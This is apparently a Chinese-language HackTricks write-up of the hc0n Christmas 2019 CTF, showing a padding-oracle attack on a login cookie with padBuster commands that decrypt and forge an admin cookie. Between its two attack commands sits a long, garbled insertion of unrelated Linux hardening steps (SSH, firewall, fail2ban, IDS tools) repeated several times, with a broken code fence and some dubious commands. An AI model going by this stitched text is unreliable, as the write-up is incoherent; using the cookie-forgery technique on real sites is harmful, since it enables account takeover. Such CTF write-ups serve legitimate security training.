# hc0n圣诞CTF - 2019

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

![](../../.gitbook/assets/41d0cdc8d99a8a3de2758ccbdf637a21.jpeg)

## 枚举

我开始使用我的工具[**Legion**](https://github.com/carlospolop/legion)对机器进行枚举：

![](<../../.gitbook/assets/image (244).png>)

有2个开放的端口：80（**HTTP**）和22（**SSH**）

在网页中，你可以**注册新用户**，我注意到**cookie的长度取决于用户名的长度**：

![](<../../.gitbook/assets/image (245).png>)

![](<../../.gitbook/assets/image (246).png>)

如果你改变**cookie**的一些**字节**，你会得到这个错误：

![](<../../.gitbook/assets/image (247).png>)

有了这些信息和[**阅读填充预言漏洞**](../../cryptography/padding-oracle-priv.md)，我能够利用它：
```bash
perl ./padBuster.pl http://10.10.231.5/index.php "GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" 8 -encoding 0 -cookies "hcon=GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy"
```
**设置用户为管理员：**

```bash
$ sudo usermod -aG sudo admin
```

**Create SSH key pair:**

```bash
$ ssh-keygen -t rsa -b 4096
```

**Add SSH key to authorized keys:**

```bash
$ cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
```

**Change SSH port:**

```bash
$ sudo nano /etc/ssh/sshd_config
```

修改以下行：

```bash
#Port 22
```

为：

```bash
Port <新端口号>
```

保存并退出。

**Restart SSH service:**

```bash
$ sudo service ssh restart
```

**Disable root login:**

```bash
$ sudo nano /etc/ssh/sshd_config
```

修改以下行：

```bash
#PermitRootLogin yes
```

为：

```bash
PermitRootLogin no
```

保存并退出。

**Restart SSH service:**

```bash
$ sudo service ssh restart
```

**Enable firewall:**

```bash
$ sudo ufw enable
```

**Allow SSH connections:**

```bash
$ sudo ufw allow <SSH端口号>
```

**Deny all incoming connections:**

```bash
$ sudo ufw default deny incoming
```

**Allow all outgoing connections:**

```bash
$ sudo ufw default allow outgoing
```

**Enable firewall:**

```bash
$ sudo ufw enable
```

**Check firewall status:**

```bash
$ sudo ufw status
```

**Install fail2ban:**

```bash
$ sudo apt-get install fail2ban
```

**Configure fail2ban:**

```bash
$ sudo nano /etc/fail2ban/jail.local
```

添加以下内容：

```bash
[sshd]
enabled = true
port = <SSH端口号>
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 600
```

保存并退出。

**Restart fail2ban service:**

```bash
$ sudo service fail2ban restart
```

**Install and configure logwatch:**

```bash
$ sudo apt-get install logwatch
```

**Configure logwatch:**

```bash
$ sudo nano /etc/cron.daily/00logwatch
```

修改以下行：

```bash
/usr/sbin/logwatch --output mail --mailto root
```

为：

```bash
/usr/sbin/logwatch --output mail --mailto <你的邮箱地址>
```

保存并退出。

**Install and configure rkhunter:**

```bash
$ sudo apt-get install rkhunter
```

**Update rkhunter database:**

```bash
$ sudo rkhunter --update
```

**Run rkhunter scan:**

```bash
$ sudo rkhunter --check
```

**Install and configure lynis:**

```bash
$ sudo apt-get install lynis
```

**Run lynis audit:**

```bash
$ sudo lynis audit system
```

**Install and configure chkrootkit:**

```bash
$ sudo apt-get install chkrootkit
```

**Run chkrootkit scan:**

```bash
$ sudo chkrootkit
```

**Install and configure clamav:**

```bash
$ sudo apt-get install clamav
```

**Update clamav database:**

```bash
$ sudo freshclam
```

**Run clamav scan:**

```bash
$ sudo clamscan -r /
```

**Install and configure logrotate:**

```bash
$ sudo apt-get install logrotate
```

**Configure logrotate:**

```bash
$ sudo nano /etc/logrotate.conf
```

添加以下内容：

```bash
/var/log/auth.log {
    rotate 7
    daily
    missingok
    notifempty
    delaycompress
    compress
    postrotate
        invoke-rc.d rsyslog rotate > /dev/null
    endscript
}
```

保存并退出。

**Install and configure logcheck:**

```bash
$ sudo apt-get install logcheck
```

**Configure logcheck:**

```bash
$ sudo nano /etc/logcheck/logcheck.conf
```

修改以下行：

```bash
SENDMAILTO="root"
```

为：

```bash
SENDMAILTO="<你的邮箱地址>"
```

保存并退出。

**Restart logcheck service:**

```bash
$ sudo service logcheck restart
```

**Install and configure aide:**

```bash
$ sudo apt-get install aide
```

**Initialize aide database:**

```bash
$ sudo aideinit
```

**Run aide check:**

```bash
$ sudo aidecheck
```

**Install and configure tripwire:**

```bash
$ sudo apt-get install tripwire
```

**Initialize tripwire database:**

```bash
$ sudo tripwire --init
```

**Update tripwire database:**

```bash
$ sudo tripwire --update
```

**Run tripwire check:**

```bash
$ sudo tripwire --check
```

**Install and configure ossec:**

```bash
$ sudo apt-get install ossec-hids-server
```

**Configure ossec:**

```bash
$ sudo nano /var/ossec/etc/ossec.conf
```

修改以下行：

```bash
<email_notification>
    <email_to>ossec@example.com</email_to>
    <smtp_server>smtp.example.com</smtp_server>
</email_notification>
```

为：

```bash
<email_notification>
    <email_to><你的邮箱地址></email_to>
    <smtp_server><你的SMTP服务器地址></smtp_server>
</email_notification>
```

保存并退出。

**Restart ossec service:**

```bash
$ sudo service ossec restart
```

**Install and configure snort:**

```bash
$ sudo apt-get install snort
```

**Configure snort:**

```bash
$ sudo nano /etc/snort/snort.conf
```

修改以下行：

```bash
var HOME_NET any
```

为：

```bash
var HOME_NET <你的网络地址>
```

保存并退出。

**Restart snort service:**

```bash
$ sudo service snort restart
```

**Install and configure suricata:**

```bash
$ sudo apt-get install suricata
```

**Configure suricata:**

```bash
$ sudo nano /etc/suricata/suricata.yaml
```

修改以下行：

```bash
HOME_NET: "[192.168.0.0/16,10.0.0.0/8,172.16.0.0/12]"
```

为：

```bash
HOME_NET: "[<你的网络地址>]"
```

保存并退出。

**Restart suricata service:**

```bash
$ sudo service suricata restart
```

**Install and configure bro:**

```bash
$ sudo apt-get install bro
```

**Configure bro:**

```bash
$ sudo nano /usr/local/bro/etc/node.cfg
```

修改以下行：

```bash
interface=eth0
```

为：

```bash
interface=<你的网络接口>
```

保存并退出。

**Restart bro service:**

```bash
$ sudo service bro restart
```

**Install and configure wazuh:**

```bash
$ sudo apt-get install wazuh-manager
```

**Configure wazuh:**

```bash
$ sudo nano /var/ossec/etc/ossec.conf
```

修改以下行：

```bash
<email_notification>
    <email_to>ossec@example.com</email_to>
    <smtp_server>smtp.example.com</smtp_server>
</email_notification>
```

为：

```bash
<email_notification>
    <email_to><你的邮箱地址></email_to>
    <smtp_server><你的SMTP服务器地址></smtp_server>
</email_notification>
```

保存并退出。

**Restart wazuh service:**

```bash
$ sudo service wazuh-manager restart
```

**Install and configure modsecurity:**

```bash
$ sudo apt-get install libapache2-modsecurity
```

**Configure modsecurity:**

```bash
$ sudo nano /etc/modsecurity/modsecurity.conf
```

修改以下行：

```bash
SecRuleEngine DetectionOnly
```

为：

```bash
SecRuleEngine On
```

保存并退出。

**Restart Apache service:**

```bash
$ sudo service apache2 restart
```

**Install and configure fail2ban:**

```bash
$ sudo apt-get install fail2ban
```

**Configure fail2ban:**

```bash
$ sudo nano /etc/fail2ban/jail.local
```

添加以下内容：

```bash
[apache]
enabled = true
port = http,https
filter = apache-auth
logpath = /var/log/apache2/*error.log
maxretry = 3
bantime = 600
```

保存并退出。

**Restart fail2ban service:**

```bash
$ sudo service fail2ban restart
```

**Install and configure logrotate:**

```bash
$ sudo apt-get install logrotate
```

**Configure logrotate:**

```bash
$ sudo nano /etc/logrotate.d/apache2
```

添加以下内容：

```bash
/var/log/apache2/*.log {
    weekly
    missingok
    rotate 52
    compress
    delaycompress
    notifempty
    create 640 root adm
    sharedscripts
    postrotate
        if /etc/init.d/apache2 status > /dev/null ; then \
            /etc/init.d/apache2 reload > /dev/null; \
        fi;
    endscript
}
```

保存并退出。

**Install and configure lynis:**

```bash
$ sudo apt-get install lynis
```

**Run lynis audit:**

```bash
$ sudo lynis audit system
```

**Install and configure chkrootkit:**

```bash
$ sudo apt-get install chkrootkit
```

**Run chkrootkit scan:**

```bash
$ sudo chkrootkit
```

**Install and configure clamav:**

```bash
$ sudo apt-get install clamav
```

**Update clamav database:**

```bash
$ sudo freshclam
```

**Run clamav scan:**

```bash
$ sudo clamscan -r /
```

**Install and configure logwatch:**

```bash
$ sudo apt-get install logwatch
```

**Configure logwatch:**

```bash
$ sudo nano /etc/cron.daily/00logwatch
```

修改以下行：

```bash
/usr/sbin/logwatch --output mail --mailto root
```

为：

```bash
/usr/sbin/logwatch --output mail --mailto <你的邮箱地址>
```

保存并退出。

**Install and configure rkhunter:**

```bash
$ sudo apt-get install rkhunter
```

**Update rkhunter database:**

```bash
$ sudo rkhunter --update
```

**Run rkhunter scan:**

```bash
$ sudo rkhunter --check
```

**Install and configure ossec:**

```bash
$ sudo apt-get install ossec-hids-server
```

**Configure ossec:**

```bash
$ sudo nano /var/ossec/etc/ossec.conf
```

修改以下行：

```bash
<email_notification>
    <email_to>ossec@example.com</email_to>
    <smtp_server>smtp.example.com</smtp_server>
</email_notification>
```

为：

```bash
<email_notification>
    <email_to><你的邮箱地址></email_to>
    <smtp_server><你的SMTP服务器地址></smtp_server>
</email_notification>
```

保存并退出。

**Restart ossec service:**

```bash
$ sudo service ossec restart
```

**Install and configure snort:**

```bash
$ sudo apt-get install snort
```

**Configure snort:**

```bash
$ sudo nano /etc/snort/snort.conf
```

修改以下行：

```bash
var HOME_NET any
```

为：

```bash
var HOME_NET <你的网络地址>
```

保存并退出。

**Restart snort service:**

```bash
$ sudo service snort restart
```

**Install and configure suricata:**

```bash
$ sudo apt-get install suricata
```

**Configure suricata:**

```bash
$ sudo nano /etc/suricata/suricata.yaml
```

修改以下行：

```bash
HOME_NET: "[192.168.0.0/16,10.0.0.0/8,172.16.0.0/12]"
```

为：

```bash
HOME_NET: "[<你的网络地址>]"
```

保存并退出。

**Restart suricata service:**

```bash
$ sudo service suricata restart
```

**Install and configure bro:**

```bash
$ sudo apt-get install bro
```

**Configure bro:**

```bash
$ sudo nano /usr/local/bro/etc/node.cfg
```

修改以下行：

```bash
interface=eth0
```

为：

```bash
interface=<你的网络接口>
```

保存并退出。

**Restart bro service:**

```bash
$ sudo service bro restart
```

**Install and configure wazuh:**

```bash
$ sudo apt-get install wazuh-manager
```

**Configure wazuh:**

```bash
$ sudo nano /var/ossec/etc/ossec.conf
```

修改以下行：

```bash
<email_notification>
    <email_to>ossec@example.com</email_to>
    <smtp_server>smtp.example.com</smtp_server>
</email_notification>
```

为：

```bash
<email_notification>
    <email_to><你的邮箱地址></email_to>
    <smtp_server><你的SMTP服务器地址></smtp_server>
</email_notification>
```

保存并退出。

**Restart wazuh service:**

```bash
$ sudo service wazuh-manager restart
```

**Install and configure modsecurity:**

```bash
$ sudo apt-get install libapache2-modsecurity
```

**Configure modsecurity:**

```bash
$ sudo nano /etc/modsecurity/modsecurity.conf
```

修改以下行：

```bash
SecRuleEngine DetectionOnly
```

为：

```bash
SecRuleEngine On
```

保存并退出。

**Restart Apache service:**

```bash
$ sudo service apache2 restart
```

**Install and configure fail2ban:**

```bash
$ sudo apt-get install fail2ban
```

**Configure fail2ban:**

```bash
$ sudo nano /etc/fail2ban/jail.local
```

添加以下内容：

```bash
[apache]
enabled = true
port = http,https
filter = apache-auth
logpath = /var/log/apache2/*error.log
maxretry = 3
bantime = 600
```

保存并退出。

**Restart fail2ban service:**

```bash
$ sudo service fail2ban restart
```

**Install and configure logrotate:**

```bash
$ sudo apt-get install logrotate
```

**Configure logrotate:**

```bash
$ sudo nano /etc/logrotate.d/apache2
```

添加以下内容：

```bash
/var/log/apache2/*.log {
    weekly
    missingok
    rotate 52
    compress
    delaycompress
    notifempty
    create 640 root adm
    sharedscripts
    postrotate
        if /etc/init.d/apache2 status > /dev/null ; then \
            /etc/init.d/apache2 reload > /dev/null; \
        fi;
    endscript
}
```

保存并退出。

**Install and configure lynis:**

```bash
$ sudo apt-get install lynis
```

**Run lynis audit:**

```bash
$ sudo lynis audit system
```

**Install and configure chkrootkit:**

```bash
$ sudo apt-get install chkrootkit
```

**Run chkrootkit scan:**

```bash
$ sudo chkrootkit
```

**Install and configure clamav:**

```bash
$ sudo apt-get install clamav
```

**Update clamav database:**

```bash
$ sudo freshclam
```

**Run clamav scan:**

```bash
$ sudo clamscan -r /
```

**Install and configure logwatch:**

```bash
$ sudo apt-get install logwatch
```

**Configure logwatch:**

```bash
$ sudo nano /etc/cron.daily/00logwatch
```

修改以下行：

```bash
/usr/sbin/logwatch --output mail --mailto root
```

为：

```bash
/usr/sbin/logwatch --output mail --mailto <你的邮箱地址>
```

保存并退出。

**Install and configure rkhunter:**

```bash
$ sudo apt-get install rkhunter
```

**Update rkhunter database:**

```bash
$ sudo rkhunter --update
```

**Run rkhunter scan:**

```bash
$ sudo rkhunter --check
```

**Install and configure ossec:**

```bash
$ sudo apt-get install ossec-hids-server
```

**Configure ossec:**

```bash
$ sudo nano /var/ossec/etc/ossec.conf
```

修改以下行：

```bash
<email_notification>
    <email_to>ossec@example.com</email_to>
    <smtp_server>smtp.example.com</smtp_server>
</email_notification>
```

为：

```bash
<email_notification>
    <email_to><你的邮箱地址></email_to>
    <smtp_server><你的SMTP服务器地址></smtp_server>
</email_notification>
```

保存并退出。

**Restart ossec service:**

```bash
$ sudo service ossec restart
```

**Install and configure snort:**

```bash
$ sudo apt-get install snort
```

**Configure snort:**

```bash
$ sudo nano /etc/snort/snort.conf
```

修改以下行：

```bash
var HOME_NET any
```

为：

```bash
var HOME_NET <你的网络地址>
``
```bash
perl ./padBuster.pl http://10.10.231.5/index.php "GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" 8 -encoding 0 -cookies "hcon=GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" -plaintext "user=admin"
```
![](<../../.gitbook/assets/image (250).png>)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks的衣物**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或者 [**telegram群组**](https://t.me/peass) 或者 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
